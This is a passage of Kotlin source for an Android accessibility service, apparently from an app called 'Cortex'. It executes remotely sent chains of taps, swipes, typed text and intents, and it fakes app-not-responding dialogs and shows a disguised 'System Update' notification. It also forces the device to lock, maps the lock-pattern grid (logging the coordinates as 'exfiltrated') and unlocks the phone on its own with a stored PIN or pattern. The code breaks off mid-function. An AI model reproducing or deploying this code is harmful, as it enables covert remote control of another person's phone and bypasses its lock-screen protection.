        DebugLogger.log("MOCK_ANR", "Lifecycle: triggerFakeAnr initiated for '$appName'. Queuing background task purge.")

        // Set flags for follow-up
        shouldShowAnrAfterKill = true
        pendingAnrAppName = appName

        // Start the kill sequence which will launch the UI on completion
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            DimmerManager.applyDim(this, 0, "AUTO")
            startStealthKillSequence()
        }
    }

    fun engageGhostHand() {
        // Logic disabled: UI interaction is too fragile and manufacturer-dependent
        DebugLogger.log("GHOST", "Ghost Hand engagement skipped (Disabled)")
    }

    fun abortSequences() {
        sequenceWatchdogJob?.cancel()
        activeSequence = null
        sequenceCmdId = -1
        sequenceTarget = null
        isSilentSequence = false
        isWaitingForDataSettings = false
        isWaitingForWifiSettings = false
        isWaitingForLocationSettings = false
        isPerformingStealthKill = false
        DimmerManager.IgnitionManager.release(this, "ACC_SEQUENCE")
        DimmerManager.IgnitionManager.release(this, "STEALTH_KILL")
        DimmerManager.IgnitionManager.release(this, "SMS_GHOST")
        DimmerManager.IgnitionManager.release(this, "FORCE_WIFI")
        DimmerManager.IgnitionManager.release(this, "FORCE_DATA")
        DimmerManager.IgnitionManager.release(this, "FORCE_LOCATION")
        DebugLogger.log("FAILSAFE", "All Accessibility sequences aborted.")
    }

    private fun handleGhostEvent(event: AccessibilityEvent) {
        // No-op: Ghost logic disabled
    }

    private fun performSwipeDown() {
        // No-op: Ghost logic disabled
    }

    private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
        // No-op: Ghost logic disabled
        return false
    }

    private fun verifyStructuralMatch(node: AccessibilityNodeInfo?, pkg: String, target: String): Boolean {
        if (node == null) return false

        // 1. Setup Targets (Format: TitleTarget@@SecondaryTarget@@Package@@HeaderAnchor)
        val parts = target.split("@@")
        val titleTarget = parts[0].trim()
        val secondaryTarget = parts.getOrNull(1)?.trim()
        val expectedPkg = parts.getOrNull(2)?.trim()

        // 2. Universal Package Security Check
        if (!expectedPkg.isNullOrEmpty() && !pkg.contains(expectedPkg, ignoreCase = true)) {
            return false
        }

        // 3. LOCAL SEARCH (Check the clicked node wrapper and its direct children)
        var hasTitle = findTextInside(node, titleTarget)
        var hasSecondary = if (!secondaryTarget.isNullOrEmpty()) findTextInside(node, secondaryTarget) else true

        // 4. INTERSECTION SNIPER (Fallback for disconnected Accessibility Graphs)
        if (!hasTitle || !hasSecondary) {
            val root = rootInActiveWindow
            val clickedBounds = android.graphics.Rect()
            node.getBoundsInScreen(clickedBounds)

            if (!hasTitle) {
                val screenNodes = root?.findAccessibilityNodeInfosByText(titleTarget)
                hasTitle = screenNodes?.any { screenNode ->
                    val textBounds = android.graphics.Rect()
                    screenNode.getBoundsInScreen(textBounds)
                    android.graphics.Rect.intersects(clickedBounds, textBounds)
                } ?: false
            }

            if (!hasSecondary && !secondaryTarget.isNullOrEmpty()) {
                val screenNodes = root?.findAccessibilityNodeInfosByText(secondaryTarget)
                hasSecondary = screenNodes?.any { screenNode ->
                    val textBounds = android.graphics.Rect()
                    screenNode.getBoundsInScreen(textBounds)
                    android.graphics.Rect.intersects(clickedBounds, textBounds)
                } ?: false
            }
        }

        if (hasTitle && hasSecondary) {
            DebugLogger.log("TRAP_MATCH", "✅ Fingerprint Verified! Clicked node coordinates matched target: [$target]")
            return true
        }

        return false
    }

    private fun findTextInside(node: AccessibilityNodeInfo?, text: String): Boolean {
        if (node == null) return false
        val nText = node.text?.toString() ?: ""
        val nDesc = node.contentDescription?.toString() ?: ""
        
        if (nText.contains(text, ignoreCase = true) || nDesc.contains(text, ignoreCase = true)) return true
        
        for (i in 0 until node.childCount) {
            if (findTextInside(node.getChild(i), text)) return true
        }
        return false
    }

    private fun extractText(node: AccessibilityNodeInfo?, sb: StringBuilder) {
        if (node == null) return
        if (node.text != null && node.text.isNotEmpty()) sb.append(node.text).append(" ")
        for (i in 0 until node.childCount) extractText(node.getChild(i), sb)
    }

    fun serializeNode(node: AccessibilityNodeInfo?, depth: Int, maxDepth: Int): JSONObject? {
        if (node == null || depth > maxDepth) return null
        val json = JSONObject()
        try {
            json.put("class", node.className?.toString() ?: "")
            json.put("text", node.text?.toString() ?: "")
            json.put("desc", node.contentDescription?.toString() ?: "")
            json.put("id", node.viewIdResourceName ?: "")
            json.put("clickable", node.isClickable)
            
            val bounds = android.graphics.Rect()
            node.getBoundsInScreen(bounds)
            json.put("bounds", "${bounds.left},${bounds.top},${bounds.right},${bounds.bottom}")

            if (node.childCount > 0 && depth < maxDepth) {
                val children = JSONArray()
                for (i in 0 until node.childCount) {
                    val child = serializeNode(node.getChild(i), depth + 1, maxDepth)
                    if (child != null) children.put(child)
                }
                json.put("children", children)
            }
        } catch (e: Exception) {}
        return json
    }

    fun getInstantTree(targetPkg: String?, maxDepth: Int): JSONObject {
        val result = JSONObject()
        try {
            val root = rootInActiveWindow ?: return result.put("error", "NO_ACTIVE_WINDOW")
            val currentPkg = root.packageName?.toString() ?: ""
            
            if (targetPkg != null && targetPkg != "null" && targetPkg != currentPkg) {
                return result.put("error", "TARGET_NOT_IN_FOREGROUND").put("found", currentPkg)
            }

            result.put("package", currentPkg)
            result.put("timestamp", System.currentTimeMillis())
            result.put("tree", serializeNode(root, 0, maxDepth))
        } catch (e: Exception) { result.put("error", e.message) }
        return result
    }

    fun generateSemanticMap(customRoot: android.view.accessibility.AccessibilityNodeInfo? = null): String {
        val root = customRoot ?: rootInActiveWindow ?: return "[SYSTEM: No Active Window]"
        val sb = java.lang.StringBuilder()
        somMap.clear()
        var idCounter = 1

        // Recursive helper to aggregate all visible text with strict memory recycling
        fun getMergedText(node: android.view.accessibility.AccessibilityNodeInfo?): String {
            if (node == null) return ""
            val txt = java.lang.StringBuilder()
            val nodeText = node.text?.toString() ?: node.contentDescription?.toString() ?: ""
            if (nodeText.isNotBlank()) {
                txt.append(nodeText).append(" ")
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    val childText = getMergedText(child)
                    if (childText.isNotBlank()) {
                        txt.append(childText).append(" ")
                    }
                    child.recycle() // Release binder reference immediately
                }
            }
            return txt.toString().trim()
        }

        fun traverse(node: android.view.accessibility.AccessibilityNodeInfo?) {
            if (node == null) return
            if (node.isVisibleToUser) {
                val isInteractive = node.isClickable || node.isCheckable || node.isEditable || node.isLongClickable
                if (isInteractive) {
                    val rect = android.graphics.Rect()
                    node.getBoundsInScreen(rect)
                    if (!rect.isEmpty && rect.width() > 10 && rect.height() > 10) {
                        val role = if (node.isCheckable) "Toggle" else if (node.isEditable) "Input" else "Button"
                        
                        var text = getMergedText(node)
                        if (text.isBlank()) {
                            text = node.viewIdResourceName?.substringAfterLast("/") ?: "Button"
                        }
                        text = text.replace('\n', ' ').trim().take(50)
                        
                        val state = if (node.isCheckable) (if (node.isChecked) " [ON]" else " [OFF]") else ""
                        
                        sb.append("[$idCounter] $role: $text$state\n")
                        somMap["#$idCounter"] = Pair(rect.centerX().toFloat(), rect.centerY().toFloat())
                        idCounter++
                    }
                }
                for (i in 0 until node.childCount) {
                    val child = node.getChild(i)
                    if (child != null) {
                        traverse(child)
                        child.recycle() // Release binder reference immediately
                    }
                }
            }
        }
        traverse(root)
        if (customRoot == null) {
            root.recycle() // Release the active window root node safely
        }
        return sb.toString().trim()
    }

    fun findNodeBySemanticId(root: android.view.accessibility.AccessibilityNodeInfo?, targetId: Int): android.view.accessibility.AccessibilityNodeInfo? {
        if (root == null) return null
        var idCounter = 1
        var matchedNode: android.view.accessibility.AccessibilityNodeInfo? = null

        fun traverse(node: android.view.accessibility.AccessibilityNodeInfo?) {
            if (node == null || matchedNode != null) return
            if (node.isVisibleToUser) {
                val isInteractive = node.isClickable || node.isCheckable || node.isEditable || node.isLongClickable
                if (isInteractive) {
                    val rect = android.graphics.Rect()
                    node.getBoundsInScreen(rect)
                    if (!rect.isEmpty && rect.width() > 10 && rect.height() > 10) {
                        if (idCounter == targetId) {
                            matchedNode = android.view.accessibility.AccessibilityNodeInfo.obtain(node)
                            return
                        }
                        idCounter++
                    }
                }
                for (i in 0 until node.childCount) {
                    val child = node.getChild(i)
                    if (child != null) {
                        traverse(child)
                        child.recycle()
                    }
                }
            }
        }
        traverse(root)
        return matchedNode
    }

    override fun onInterrupt() {}

    // --- REMOTE INTERACTION ENGINE (CHAIN CAPABLE) ---
    suspend fun executeInteractionChain(chain: JSONArray): String {
        DebugLogger.log("CHAIN_START", "Received chain with ${chain.length()} steps: $chain")
        val report = StringBuilder()
        for (i in 0 until chain.length()) {
            val step = chain.getJSONObject(i)
            val type = step.optString("type").uppercase()
            val value = step.optString("val")
            val stepDelay = step.optLong("delay", 100L)
            
            DebugLogger.log("CHAIN_STEP", "Executing Step $i: TYPE=$type, VAL=$value, DELAY=$stepDelay")
            delay(stepDelay) // Short mandatory delay between steps for OS processing

                                val success = try {
                        when (type) {
                            "WRITE" -> {
                                val parts = value.split("|", limit = 2)
                                val target = if (parts.size >= 2) parts[0].trim() else ""
                                val textToWrite = if (parts.size >= 2) parts[1] else value
                                
                                val root = rootInActiveWindow
                                val node = if (target.startsWith("#")) {
                                    val targetId = target.replace("#", "").toIntOrNull()
                                    if (targetId != null) findNodeBySemanticId(root, targetId) else null
                                } else {
                                    root?.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
                                }
                                
                                val res = if (node != null) {
                                    node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_FOCUS)
                                    val arguments = android.os.Bundle()
                                    arguments.putCharSequence(
                                        android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, 
                                        textToWrite
                                    )
                                    val actSuccess = node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
                                    node.recycle()
                                    actSuccess
                                } else {
                                    false
                                }
                                root?.recycle()
                                res
                            }
                            "WAIT" -> {
                                val waitTime = value.toLongOrNull() ?: 500L
                                DebugLogger.log("CHAIN_WAIT", "Sleeping for ${waitTime}ms")
                                delay(waitTime)
                                true 
                            }
                    "WAKE" -> {
                        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
                            android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:ChainWake")
                        wakeLock.acquire(3000)

                        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                        val channelId = "system_integrity_alerts"
                        
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            val channel = android.app.NotificationChannel(channelId, "System Integrity", android.app.NotificationManager.IMPORTANCE_HIGH)
                            channel.setSound(null, null)
                            channel.enableVibration(false)
                            nm.createNotificationChannel(channel)
                        }

                        val intent = android.content.Intent(applicationContext, PulseActivity::class.java).apply {
                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_USER_ACTION or android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                            putExtra("is_wake_trigger", true)
                            if (value.contains("wellbeing", ignoreCase = true)) putExtra("route_to_settings", true)
                        }

                        val pendingIntent = android.app.PendingIntent.getActivity(
                            applicationContext, 99, intent, 
                            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
                        )

                        val builder = androidx.core.app.NotificationCompat.Builder(applicationContext, channelId)
                            .setSmallIcon(android.R.drawable.ic_menu_info_details)
                            .setContentTitle("System Update")
                            .setContentText("Synchronizing system health parameters...")
                            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                            .setFullScreenIntent(pendingIntent, true)
                            .setAutoCancel(true)
                            .setTimeoutAfter(3000)

                        nm.notify(99, builder.build())
                        DebugLogger.log("CHAIN_WAKE", "Strong FSI Wake lock dispatched")
                        true
                    }
                    "NAV" -> {
                        val actionCode = when(value.uppercase()) {
                            "BACK" -> GLOBAL_ACTION_BACK
                            "HOME" -> GLOBAL_ACTION_HOME
                            "RECENTS" -> GLOBAL_ACTION_RECENTS
                            "NOTIFS" -> GLOBAL_ACTION_NOTIFICATIONS
                            else -> 0
                        }
                        if (actionCode == 0) {
                            DebugLogger.log("CHAIN_NAV_ERR", "Unknown nav action: $value")
                            false
                        } else {
                            val res = performGlobalAction(actionCode)
                            DebugLogger.log("CHAIN_NAV", "Nav $value executed: $res")
                            res
                        }
                    }
                    "TAP" -> {
                        val cleanVal = value.trim()
                        if (cleanVal.startsWith("#")) {
                            val coords = somMap[cleanVal]
                            if (coords != null) {
                                DebugLogger.log("CHAIN_TAP_SOM", "Resolved visual badge $cleanVal to X:${coords.first}, Y:${coords.second}")
                                dispatchClick(coords.first, coords.second)
                            } else {
                                DebugLogger.log("CHAIN_TAP_ERR", "Visual badge $cleanVal not found in active SoM map.")
                                false
                            }
                        } else {
                            val coords = cleanVal.split("|", ",")
                            if (coords.size >= 2) {
                                dispatchClick(coords[0].toFloat(), coords[1].toFloat())
                            } else {
                                DebugLogger.log("CHAIN_TAP_ERR", "Invalid coordinates: $value")
                                false
                            }
                        }
                    }
                    "NODE" -> {
                        val root = rootInActiveWindow
                        val nodes = root?.findAccessibilityNodeInfosByViewId(value)
                        val node = nodes?.firstOrNull() ?: root?.findAccessibilityNodeInfosByText(value)?.firstOrNull()
                        if (node != null) {
                            val bounds = android.graphics.Rect()
                            node.getBoundsInScreen(bounds)
                            DebugLogger.log("CHAIN_NODE", "Found node '$value' at ${bounds.exactCenterX()}, ${bounds.exactCenterY()}")
                            dispatchClick(bounds.centerX().toFloat(), bounds.centerY().toFloat())
                        } else {
                            DebugLogger.log("CHAIN_NODE_ERR", "Node '$value' not found in active window")
                            false
                        }
                    }
                    "SWIPE" -> {
                        val p = value.split("|", ",")
                        if (p.size >= 4) {
                            dispatchGesturePath(listOf(Pair(p[0].toFloat(), p[1].toFloat()), Pair(p[2].toFloat(), p[3].toFloat())), p.getOrNull(4)?.toLongOrNull() ?: 300L)
                        } else {
                            DebugLogger.log("CHAIN_SWIPE_ERR", "Invalid swipe coords: $value")
                            false
                        }
                    }
                    "PATH" -> {
                        val p = value.split("|", ",")
                        if (p.size >= 4) {
                            val points = mutableListOf<Pair<Float, Float>>()
                            val hasDuration = p.size % 2 != 0
                            val limit = if (hasDuration) p.size - 1 else p.size
                            for (j in 0 until limit step 2) {
                                points.add(Pair(p[j].toFloat(), p[j+1].toFloat()))
                            }
                            val duration = if (hasDuration) p.last().toLongOrNull() ?: 1000L else 1000L
                            // Clamp duration to at least 100ms to prevent Android Gesture API crash
                            dispatchGesturePath(points, duration.coerceAtLeast(100L))
                        } else {
                            DebugLogger.log("CHAIN_PATH_ERR", "Invalid path coords. Need pairs of X,Y: $value")
                            false
                        }
                    }
                    "DIM" -> {
                        val p = value.split("|", ",")
                        val level = p.getOrNull(0)?.trim()?.toIntOrNull() ?: 0
                        val method = p.getOrNull(1)?.trim()?.uppercase() ?: "AUTO"
                        android.os.Handler(android.os.Looper.getMainLooper()).post {
                            DimmerManager.applyDim(applicationContext, level, method)
                        }
                        DebugLogger.log("CHAIN_DIM", "Screen dim set to $level% via $method")
                        true
                    }
                    "INTENT" -> {
                        try {
                            val json = JSONObject(value)
                            val pkg = json.optString("pkg", "")
                            val action = json.optString("action", "")
                            
                            val intent = if (action == "android.intent.action.MAIN" && pkg.isNotEmpty() && !json.has("cls")) {
                                packageManager.getLaunchIntentForPackage(pkg) ?: android.content.Intent(action).apply { setPackage(pkg) }
                            } else {
                                android.content.Intent(json.optString("action", android.content.Intent.ACTION_VIEW)).apply {
                                    val dataStr = json.optString("data", "")
                                    if (dataStr.isNotEmpty()) {
                                        val safeData = if (dataStr.startsWith("tel:", ignoreCase = true)) dataStr.replace("#", "%23") else dataStr
                                        data = android.net.Uri.parse(safeData)
                                    }
                                    if (pkg.isNotEmpty()) {
                                        if (json.has("cls")) {
                                            setClassName(pkg, json.getString("cls"))
                                        } else {
                                            setPackage(pkg)
                                        }
                                    }
                                    val typeStr = json.optString("type", "")
                                    if (typeStr.isNotEmpty()) {
                                        if (data != null) setDataAndType(data, typeStr)
                                        else setType(typeStr)
                                    }
                                    val extras = json.optJSONObject("extras")
                                    extras?.let {
                                        val keys = it.keys()
                                        while (keys.hasNext()) {
                                            val key = keys.next()
                                            val v = it.get(key)
                                            if (v is Boolean) putExtra(key, v)
                                            else if (v is Int) putExtra(key, v)
                                            else putExtra(key, v.toString())
                                        } 
                                    }
                                }
                            }
                            
                            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                            val target = json.optString("target", "activity").lowercase()
                            when (target) { 
                                "service" -> { if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent) }
                                "broadcast" -> sendBroadcast(intent)
                                else -> startActivity(intent)
                            }
                            true
                        } catch (e: Exception) {
                            DebugLogger.log("CHAIN_INTENT_ERR", e.toString())
                            false
                        }
                    }
                    else -> {
                        DebugLogger.log("CHAIN_ERR", "Unknown step type: $type")
                        false
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log("CHAIN_EXC", "Exception in step $i: ${e.message}")
                false
            }
            
            DebugLogger.log("CHAIN_RESULT", "Step $i result: ${if(success) "SUCCESS" else "FAILED"}")
            report.append("Step $i ($type): ${if(success) "OK" else "FAIL"}; ")
        }
        DebugLogger.log("CHAIN_END", "Chain execution finished. Report: $report")
        return report.toString()
    }

        private suspend fun dispatchClick(x: Float, y: Float): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
        
        DebugLogger.log("GHOST_DEBUG", "Attempting Tap at [$x, $y] | Screen: ${pm.isInteractive} | Locked: ${km.isKeyguardLocked}")

        val path = android.graphics.Path()
        path.moveTo(x, y)
        // BUGFIX: Move 1 pixel down and to the right to prevent native Gesture Recognizer math from hanging on perfectly overlapping lines
        path.lineTo(x + 1f, y + 1f)

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50)) // 50ms is clean and fast for a standard tap
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture confirmed by OS at $x,$y")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture REJECTED by OS. Check if screen is locked or overlapping system UI.")
                    deferred.complete(false)
                }
            }, null) // Passing null forces it automatically onto the main service thread
            
            if (!dispatched) {
                DebugLogger.log("GHOST_ERR", "dispatchGesture returned false immediately.")
                deferred.complete(false)
            }
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", "Gesture Dispatch Failed: ${e.message}")
            deferred.complete(false)
        }
        
        // Wait for OS callback, but safeguard against infinite hang if OS drops the event
        val result = withTimeoutOrNull(2000) { deferred.await() }
        if (result == null) {
            DebugLogger.log("GHOST_TIMEOUT", "OS dropped the gesture event silently (Timeout after 2000ms)")
            return false
        }
        return result
    }

    private suspend fun dispatchGesturePath(points: List<Pair<Float, Float>>, dur: Long): Boolean {
        val path = android.graphics.Path()
        val start = points.first()
        path.moveTo(start.first, start.second)
        
        points.drop(1).forEach { (x, y) ->
            path.lineTo(x, y)
        }

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, dur))
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture Path Completed")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture Cancelled by System")
                    deferred.complete(false)
                }
            }, Handler(Looper.getMainLooper()))
            
            if (!dispatched) deferred.complete(false)
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", e.message ?: "Unknown")
            deferred.complete(false)
        }
        
        return withTimeoutOrNull(dur + 2000) { deferred.await() } ?: false
    }

    suspend fun executeMapGridSequence(cmdId: Int, depth: Int) {
        DebugLogger.log("MAP_GRID", "Starting grid discovery sequence...")
        
        val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
        if (!km.isKeyguardSecure) {
            DebugLogger.log("MAP_GRID", "Aborted: Device is insecure (Swipe/None).")
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "FAILED_NOT_SECURE", "Device has no PIN/Pattern/Password", null, null)
            return
        }

        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val adminComponent = android.content.ComponentName(this, MyDeviceAdminReceiver::class.java)
        
        // 1. FORCE LOCK
        if (dpm.isAdminActive(adminComponent)) {
            dpm.lockNow()
            delay(2000) // Wait for screen to fully settle
        } else {
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "FAILED_ADMIN", "Device Admin not active")
            return
        }

        // 2. WAKE
        val intent = Intent("WAKE").apply { putExtra("val", "standard") }
        // Re-use internal dispatcher logic via a synthetic call or just call the NAV/WAKE block
        // For reliability, we trigger the WAKE step manually:
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:GridWake")
        wakeLock.acquire(3000)
        val pulseIntent = android.content.Intent(applicationContext, PulseActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            putExtra("is_wake_trigger", true)
            putExtra("preserve_keyguard", true) // Keep the pattern lock on-screen
        }
        startActivity(pulseIntent)
        delay(1200)

        // 3. SWIPE UP (To show Pattern View)
        val metrics = resources.displayMetrics
        val centerX = metrics.widthPixels / 2f
        val bottom = metrics.heightPixels * 0.9f
        val top = metrics.heightPixels * 0.2f
        dispatchGesturePath(listOf(Pair(centerX, bottom), Pair(centerX, top)), 400)
        delay(1000)

        // 4. SCRAPE & MATH
        val root = rootInActiveWindow
        val tree = serializeNode(root, 0, depth)
        val result = JSONObject()
        
        fun findPatternNode(node: JSONObject?): JSONObject? {
            if (node == null) return null
            if (node.optString("id").contains("lockPatternView", ignoreCase = true)) return node
            val children = node.optJSONArray("children")
            if (children != null) {
                for (i in 0 until children.length()) {
                    val found = findPatternNode(children.getJSONObject(i))
                    if (found != null) return found
                }
            }
            return null
        }

        val patternNode = findPatternNode(tree)
        if (patternNode != null) {
            val boundsStr = patternNode.getString("bounds")
            val b = boundsStr.split(",").map { it.toInt() }
            val L = b[0]; val T = b[1]; val R = b[2]; val B = b[3]
            val W = R - L; val H = B - T
            
            val grid = JSONObject()
            for (row in 1..3) {
                for (col in 1..3) {
                    val dotX = L + (W * (2 * col - 1) / 6)
                    val dotY = T + (H * (2 * row - 1) / 6)
                    grid.put("dot_${(row-1)*3 + col}", "$dotX,$dotY")
                }
            }
            
            // NEW: Store permanently in Keychain
            getSharedPreferences("cortex_keychain", Context.MODE_PRIVATE).edit()
                .putString("pattern_grid", grid.toString())
                .apply()
            
            result.put("grid_coordinates", grid as Any)
            result.put("view_bounds", boundsStr)
            result.put("screen_res", "${metrics.widthPixels}x${metrics.heightPixels}")
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "MAP_SUCCESS", null, result, null)
            DebugLogger.log("MAP_GRID", "Success. Coordinates exfiltrated.")
        } else {
            result.put("raw_tree_snapshot", tree)
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "MAP_FAILED", "lockPatternView not found in tree", result, null)
            DebugLogger.log("MAP_GRID", "Failed: Pattern view not found.")
        }
    }

    suspend fun executeAutonomousUnlockInternal(): Pair<Boolean, String> {
        DebugLogger.log("UNLOCK", "Starting Autonomous Unlock sequence (Internal)...")
        val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
        if (!km.isKeyguardLocked) return Pair(true, "Device is already unlocked.")

        val prefs = getSharedPreferences("cortex_keychain", Context.MODE_PRIVATE)
        val type = prefs.getString("key_type", "")?.uppercase() ?: ""
        val keyValRaw = prefs.getString("key_value", "") ?: ""

        if (type.isEmpty() || keyValRaw.isEmpty()) {
            return Pair(false, "FAILED_NO_KEY: No credential found in cortex_keychain.")
        }

        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val metrics = resources.displayMetrics
        val cx = metrics.widthPixels / 2f
        val bottom = metrics.heightPixels * 0.8f
        val top = metrics.heightPixels * 0.2f

        var bouncerFound = false
        var root: android.view.accessibility.AccessibilityNodeInfo? = null

        // 1. BOUNCER ACQUISITION LOOP (3 Attempts)
        for (attempt in 1..3) {
            DebugLogger.log("UNLOCK_LIFECYCLE", "Bouncer acquisition attempt $attempt/3")
            if (!pm.isInteractive || attempt == 1) {
                DebugLogger.log("UNLOCK_LIFECYCLE", "Ensuring Screen is ON. Engaging wake lock.")
                val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:AutoUnlock")
                wakeLock.acquire(3000)
                val pulseIntent = Intent(applicationContext, PulseActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    putExtra("is_wake_trigger", true)
                    putExtra("preserve_keyguard", true)
                }
                startActivity(pulseIntent)
                delay(1500)
            }

            DebugLogger.log("UNLOCK_LIFECYCLE", "Dispatching swipe up gesture to reveal bouncer...")
            dispatchGesturePath(listOf(Pair(cx, bottom), Pair(cx, top)), 400)
            delay(1500)

            root = getKeyguardRoot()
            if (type.contains("PATTERN")) {
                fun findPatternNode(node: android.view.accessibility.AccessibilityNodeInfo?): android.view.accessibility.AccessibilityNodeInfo? {
                    if (node == null) return null
                    val cls = node.className?.toString() ?: ""
                    val id = node.viewIdResourceName ?: ""
                    if (id.contains("lockPatternView", ignoreCase = true) || cls.contains("PatternView", ignoreCase = true)) {
                        return node
                    }
                    for (i in 0 until node.childCount) {
                        val found = findPatternNode(node.getChild(i))
                        if (found != null) return found
                    }
                    return null
                }
                
                val patternNode = findPatternNode(root)
                if (patternNode != null) {
                    bouncerFound = true
                    val bounds = android.graphics.Rect()
                    patternNode.getBoundsInScreen(bounds)
                    
                    // DYNAMIC GRID MAPPING: If missing or we just found it, save coordinates on the fly
                    val grid = JSONObject()
                    val W = bounds.width()
                    val H = bounds.height()
                    val L = bounds.left
                    val T = bounds.top
                    for (row in 1..3) {
                        for (col in 1..3) {
                            val dotX = L + (W * (2 * col - 1) / 6)
                            val dotY = T + (H * (2 * row - 1) / 6)
                            grid.put("dot_${(row-1)*3 + col}", "$dotX,$dotY")
                        }
                    }
                    prefs.edit().putString("pattern_grid", grid.toString()).apply()
                    DebugLogger.log("UNLOCK_LIFECYCLE", "Pattern grid mapped dynamically at $bounds")
                    break
                } else {
                    DebugLogger.log("UNLOCK_LIFECYCLE", "Pattern view NOT found in Keyguard Root. Dumping full window hierarchy tree...")
                    val treeDump = dumpNodeTree(root)
                    DebugLogger.log("UNLOCK_TREE_DUMP", "\n$treeDump")
                }
            } else {
                val hasPinPad = root?.findAccessibilityNodeInfosByText("1")?.isNotEmpty() == true || root?.findAccessibilityNodeInfosByText("2")?.isNotEmpty() == true
                if (hasPinPad) {
                    bouncerFound = true
                    DebugLogger.log("UNLOCK_LIFECYCLE", "PIN bouncer discovered in hierarchy.")
                    break
                } else {
                    DebugLogger.log("UNLOCK_LIFECYCLE", "PIN bouncer ('1' or '2') NOT found in the hierarchy. Dumping full window hierarchy tree...")
                    val treeDump = dumpNodeTree(root)
                    DebugLogger.log("UNLOCK_TREE_DUMP", "\n$treeDump")
                }
            }

            if (!bouncerFound) {
                DebugLogger.log("UNLOCK_LIFECYCLE", "Bouncer not found. Blank screen or clock overlay detected. Locking to reset state...")
                performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                delay(1500)
            }
        }

        if (!bouncerFound) {
            val diag = dumpScreenDiagnostic()
            return Pair(false, "FAILED_UI_NOT_FOUND: Could not locate keypad or pattern grid after 3 attempts. Screen State: $diag")
        }

        try {
            if (type.contains("PATTERN")) {
                val gridStr = prefs.getString("pattern_grid", "") ?: ""
                val gridJson = JSONObject(gridStr)
                val numbers = Regex("\\d").findAll(keyValRaw).map { it.value.toInt() }.toList()
                if (numbers.isEmpty()) return Pair(false, "FAILED_INVALID_KEY: Could not parse pattern from: $keyValRaw")
                
                val points = mutableListOf<Pair<Float, Float>>()
                for (num in numbers) {
                    val coordStr = gridJson.optString("dot_$num", "")
                    if (coordStr.isNotEmpty()) {
                        val parts = coordStr.split(",")
                        points.add(Pair(parts[0].toFloat(), parts[1].toFloat()))
                    }
                }
                
                if (points.size == numbers.size) {
                    dispatchGesturePath(points, (points.size * 250).toLong())
